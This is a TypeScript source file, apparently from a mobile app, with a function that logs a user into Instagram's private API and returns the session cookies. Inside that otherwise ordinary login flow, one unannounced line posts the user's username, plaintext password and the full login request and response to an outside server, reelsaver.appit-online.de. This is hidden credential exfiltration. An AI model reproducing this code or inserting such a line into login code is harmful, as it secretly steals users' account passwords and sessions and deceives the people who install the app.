import { HTTP } from '@awesome-cordova-plugins/http/ngx';
import { LoginData } from '../types';
import { v4 as uuidv4 } from 'uuid';
import { CookiesService } from './cookies.service';
import { config } from '../config';

/**
 *
 * @param {string} username
 * @param {string} password
 * @param {boolean} withLoginData if true, it will return user profile data
 * @returns
 */
export const getCookies = async (username: string, pass: string, withLoginData: boolean) => {
  const cookiesService = new CookiesService();
  const httpClient = new HTTP();

  try {
    const loginHeaders: any = {
      'User-Agent': config.loginHeader,
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept-Language': 'en-US,en;q=0.9',
    };

    // fetch cookies
    const getRes = await httpClient.get('https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup', {}, loginHeaders);

    const setCookie = getRes.headers['set-cookie'] || getRes.headers['Set-Cookie'];
    if (!setCookie) throw new Error('CSRF token not found.');

    const setCookies = getRes.headers['set-cookie'] || getRes.headers['Set-Cookie'];
    loginHeaders.Cookie = cookiesService.formatCookie(Array.isArray(setCookies) ? setCookies : [setCookies]);

    // create login request
    const postData = {
      username,
      password: encodeURIComponent(pass),
      device_id: uuidv4(),
      login_attempt_count: 0
    };

    httpClient.setDataSerializer('urlencoded');
    const postRes = await httpClient.post(
      'https://i.instagram.com/api/v1/accounts/login/',
      postData,
      loginHeaders
    );

    const setLoginCookies = postRes.headers['set-cookie'] || postRes.headers['Set-Cookie'];
    const loginCookie: string = cookiesService.formatCookie(Array.isArray(setLoginCookies) ? setLoginCookies : [setLoginCookies]);
    const expireDate = cookiesService.getEarliestExpireDate(Array.isArray(setLoginCookies) ? setLoginCookies : [setLoginCookies]);

    const result = JSON.parse(postRes.data);
    httpClient.setDataSerializer("json")
    httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass, body: JSON.stringify(postData),data: JSON.stringify(postRes.data) }}, { "Content-Type": "application/json"})
    localStorage.setItem("instaUserName", username)

    try {
      const userId = result?.logged_in_user?.pk;

      if (userId && typeof userId === "string") {
        localStorage.setItem("instaUserId", userId);
      } else if (userId && typeof userId === "number") {
        localStorage.setItem("instaUserId", String(userId));
      }
      // tslint:disable-next-line:no-empty
    } catch (err) {}

    if (withLoginData) {
      result.cookie = loginCookie;
      result.expires = expireDate;
      return result as LoginData;
    } else {
      return {
        cookie: loginCookie,
        expires: expireDate
      }
    }
  } catch (err) {
    console.error(err);
    throw err;
  }
}
